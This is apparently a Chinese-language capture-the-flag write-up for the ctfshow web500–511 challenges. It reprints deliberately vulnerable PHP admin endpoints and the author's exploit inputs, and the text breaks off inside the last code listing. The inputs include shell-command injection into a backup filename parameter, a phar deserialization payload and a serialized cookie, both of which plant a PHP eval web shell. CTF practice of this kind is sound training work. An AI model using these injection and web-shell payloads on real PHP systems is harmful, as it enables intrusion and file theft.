alt="image-20220413212450700"></p><p>这次多了一个数据库备份</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212901748.png" alt="image-20220413212901748"></p><p>找到一个备份地址</p><p>api&#x2F;admin_db_backup.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 17:22:29 Last Modified by:   h1xa Last Modified time: 2021-03-16 19:17:07 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.__DIR__.&#39;/../backup/&#39;.$db_path);    if(file_exists(__DIR__.&#39;/../backup/&#39;.$db_path))&#123;        $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>命令执行</p><pre><code class="php">;cp /f* /var/www/html/zf.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215811269.png" alt="image-20220413215811269"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215857742.png" alt="image-20220413215857742"></p><h1 id="web501"><a href="#web501" class="headerlink" title="web501"></a>web501</h1><p>api&#x2F;admin_db_backup.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 17:22:29 Last Modified by:   h1xa Last Modified time: 2021-03-17 14:39:25 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if(preg_match(&#39;/^zip|tar|sql$/&#39;, $db_format))&#123;        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format);        if(file_exists(__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format))&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;        &#125;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;    &#125;        die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><pre><code class="php">db_format=tar; cp /f* /var/www/html/zf.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220821778.png" alt="image-20220413220821778"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220833082.png" alt="image-20220413220833082"></p><h1 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 17:22:29 Last Modified by:   h1xa Last Modified time: 2021-03-18 22:15:42 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if(file_exists($pre.$db_format))&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;            die(json_encode($ret));    &#125;    if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&#123;        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.$pre.$db_format);        if(file_exists($pre.$db_format))&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;        &#125;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>这不是顾头不顾腚吗</p><pre><code class="php">l; cp /f* /var/www/html/zf.txt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221724286.png" alt="image-20220413221724286"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221731992.png" alt="image-20220413221731992"></p><h1 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 17:22:29 Last Modified by:   h1xa Last Modified time: 2021-03-18 22:15:42 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if(file_exists($pre.$db_format))&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;            die(json_encode($ret));    &#125;    if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&#123;        shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.md5($pre.$db_format));        if(file_exists($pre.$db_format))&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;        &#125;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413222608356.png" alt="image-20220413222608356"></p><p>又找到一个好东西</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-18 21:53:13 Last Modified by:   h1xa Last Modified time: 2021-03-18 22:11:18 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    $arr = $_FILES[&quot;file&quot;];    if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )    &#123;        $arr[&quot;tmp_name&quot;];        $filename = md5($arr[&#39;name&#39;]);        $ext = pathinfo($arr[&#39;name&#39;],PATHINFO_EXTENSION);        if(!preg_match(&#39;/^php$/i&#39;, $ext))&#123;            $basename = &quot;../img/&quot;.$filename.&#39;.&#39; . $ext;            move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));            $config[&#39;logo&#39;]=$filename.&#39;.&#39; . $ext;            file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));            $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;        &#125;            &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;    &#125;        die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>这不是来了吗,有一个file_exists($pre.$db_format),还有文件上传.并且这里面的参数还可控</p><pre><code class="php">&lt;?phpclass dbLog&#123;    public $sql;    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;    public $log =&quot;./zf.php&quot;;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;$final = new dbLog();@unlink(&#39;zf.phar&#39;);$phar=new Phar(&#39;zf.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$phar-&gt;setMetadata($final);$phar-&gt;addFromString(&quot;zf.txt&quot;,&quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223842488.png" alt="image-20220413223842488"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223917170.png" alt="image-20220413223917170"></p><pre><code class="php">db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&amp;pre=phar:///var/www/html/</code></pre><p>记住使用phar:&#x2F;&#x2F;协议哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224734911.png" alt="image-20220413224734911"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224744176.png" alt="image-20220413224744176"></p><h1 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414104704841.png" alt="image-20220414104704841"></p><p>这里也是搜到一个模板php,但是这里读取不了源码了</p><p>我们查看一下抓个包试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105156834.png" alt="image-20220414105156834"></p><p>可以看到这里访问的index.sml文件.我们试试有没有文件遍历</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105404649.png" alt="image-20220414105404649"></p><p>可见查询失败</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105530888.png" alt="image-20220414105530888"></p><p>下载这里也是一样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105605711.png" alt="image-20220414105605711"></p><p>新增模板呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105811237.png" alt="image-20220414105811237"></p><p>上传成功.我们试试.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105901789.png" alt="image-20220414105901789"></p><p>&#x2F;api&#x2F;admin_settings.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 15:50:14 Last Modified by:   h1xa Last Modified time: 2021-03-16 16:26:31 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));    foreach ($_POST as $key =&gt; $value) &#123;        $config[$key]=$value;    &#125;    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>复习一个这个文件</p><pre><code class="php">&lt;?phpclass dbLog&#123;    public $sql;    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;    public $log =&quot;./zf.php&quot;;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;$final = new dbLog();echo &#39;;user=&#39;.urlencode(serialize($final));#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112216286.png" alt="image-20220414112216286"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112259433.png" alt="image-20220414112259433"></p><p>可见已经反序列化了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414113103225.png" alt="image-20220414113103225"></p><h1 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121330746.png" alt="image-20220414121330746"></p><p>这次发现又多了一个文件查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121359533.png" alt="image-20220414121359533"></p><p>发现可以看到源码.我们看下新加的文件</p><p>api&#x2F;admin_file_view.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-24 00:53:45 Last Modified by:   h1xa Last Modified time: 2021-03-24 02:49:36 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;        include($f);    &#125;else&#123;        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));    &#125;    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414122321538.png" alt="image-20220414122321538"></p><p>先传一个文件上去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123323733.png" alt="image-20220414123323733"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123406853.png" alt="image-20220414123406853"></p><h1 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h1><p>api&#x2F;admin_file_view.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-24 00:53:45 Last Modified by:   h1xa Last Modified time: 2021-03-24 02:49:36 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    $ext = substr($f, strlen($f)-3,3);    if(preg_match(&#39;/php|sml|phar/i&#39;, $ext))&#123;        $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;        die(json_encode($ret));    &#125;    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;        include($f);    &#125;else&#123;        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));    &#125;    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414124910368.png" alt="image-20220414124910368"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125413444.png" alt="image-20220414125413444"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125540070.png" alt="image-20220414125540070"></p><h1 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h1><p>api&#x2F;admin_file_view.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-24 00:53:45 Last Modified by:   h1xa Last Modified time: 2021-03-24 02:49:36 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    $ext = substr($f, strlen($f)-3,3);    if(preg_match(&#39;/php|sml|phar/i&#39;, $ext))&#123;        $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;        die(json_encode($ret));    &#125;    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;        include($f);    &#125;else&#123;        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));    &#125;    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>api&#x2F;admin_templates.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-19 18:49:54 Last Modified by:   h1xa Last Modified time: 2021-03-24 00:33:25 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );$action=$_GET[&#39;action&#39;];if(!isset($user))&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;switch ($action) &#123;    case &#39;list&#39;:        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;        $db=new db();        $temps = $db-&gt;select_array($sql);        if(count($temps)&gt;0)&#123;            $ret[&#39;count&#39;]=count($temps);            $ret[&#39;data&#39;]=$temps;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;        &#125;        break;    case &#39;update&#39;:        extract($_POST);        $row=json_decode($row);        if(waf($row))&#123;            break;        &#125;        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;        $db = new db();        if($db-&gt;update_one($sql))&#123;            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;        &#125;        break;    case &#39;getContents&#39;:        extract($_POST);        $template=json_decode($template);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $template-&gt;path))&#123;            $ret[&#39;count&#39;]=1;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));        &#125;        break;    case &#39;download&#39;:        extract($_POST);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $path))&#123;            header(&quot;Content-Type: application/octet-stream&quot;);             header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);            exit();        &#125;        break;    case &#39;upload&#39;:        extract($_POST);        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))        &#123;            if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;            &#125;else&#123;                file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;            &#125;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;        &#125;        break;    default:        # code...        break;&#125;function waf($row)&#123;    $ret = false;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;name))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;type))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;des))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;path))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;id))&#123;        $ret=true;    &#125;    return $ret;&#125;die(json_encode($ret));</code></pre><p>这次对文件上传进行了过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130230633.png" alt="image-20220414130230633"></p><p>从这里传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130410885.png" alt="image-20220414130410885"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130450436.png" alt="image-20220414130450436"></p><h1 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h1><p>api&#x2F;admin_edit.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-15 04:27:41 Last Modified by:   h1xa Last Modified time: 2021-03-15 07:45:25 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;        die(json_encode($ret));    &#125;    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;    $db=new db();    if($db-&gt;update_one($sql))&#123;        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>可见这里并没有将图片放到本地,而是放到了session里面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131751499.png" alt="image-20220414131751499"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131808105.png" alt="image-20220414131808105"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414132009224.png" alt="image-20220414132009224"></p><h1 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133327832.png" alt="image-20220414133327832"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133433745.png" alt="image-20220414133433745"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133503550.png" alt="image-20220414133503550"></p><h1 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133936922.png" alt="image-20220414133936922"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134023254.png" alt="image-20220414134023254"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134049496.png" alt="image-20220414134049496"></p><h1 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h1><p>&#x2F;index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-25 16:43:05 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    if(isset($_COOKIE[&#39;user&#39;]))&#123;        $c=$_COOKIE[&#39;user&#39;];        if(!preg_match(&#39;/\:|\,/&#39;, $c))&#123;            $user=unserialize($c);        &#125;        if($user)&#123;            templateUtil::render(&#39;index&#39;);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;    die();    &#125;switch ($action) &#123;    case &#39;check&#39;:        extract($_POST);        if(!preg_match(&#39;/file|or|innodb|sys|mysql/i&#39;, $username))&#123;            $sql = &quot;select username,nickname,avatar from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;            $db=new db();            $user=$db-&gt;select_one_array($sql);        &#125;        if($user)&#123;            $_SESSION[&#39;user&#39;]=$user;            header(&#39;location:index.php?action=index&#39;);        &#125;else&#123;            templateUtil::render(&#39;error&#39;);        &#125;        break;    case &#39;clear&#39;:        system(&#39;rm -rf cache/*&#39;);        die(&#39;cache clear&#39;);        break;    case &#39;login&#39;:        templateUtil::render($action);        break;    case &#39;index&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render(&#39;index&#39;,$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;view&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render($_GET[&#39;page&#39;],$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;logout&#39;:        session_destroy();        header(&#39;location:index.php?action=login&#39;);        break;    default:        templateUtil::render($action);        break;&#125;</code></pre><p>api&#x2F;admin_templates.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-19 18:49:54 Last Modified by:   h1xa Last Modified time: 2021-03-25 17:17:07 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );$action=$_GET[&#39;action&#39;];if(!isset($user))&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;switch ($action) &#123;    case &#39;list&#39;:        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;        $db=new db();        $temps = $db-&gt;select_array($sql);        if(count($temps)&gt;0)&#123;            $ret[&#39;count&#39;]=count($temps);            $ret[&#39;data&#39;]=$temps;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;        &#125;        break;    case &#39;update&#39;:        extract($_POST);        $row=json_decode($row);        if(waf($row))&#123;            break;        &#125;        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;        $db = new db();        if($db-&gt;update_one($sql))&#123;            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;        &#125;        break;    case &#39;getContents&#39;:        extract($_POST);        $template=json_decode($template);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&gt;path))&#123;            $ret[&#39;count&#39;]=1;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));        &#125;        break;    case &#39;download&#39;:        extract($_POST);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&#123;            header(&quot;Content-Type: application/octet-stream&quot;);             header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);            exit();        &#125;        break;    case &#39;upload&#39;:        extract($_POST);        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))        &#123;                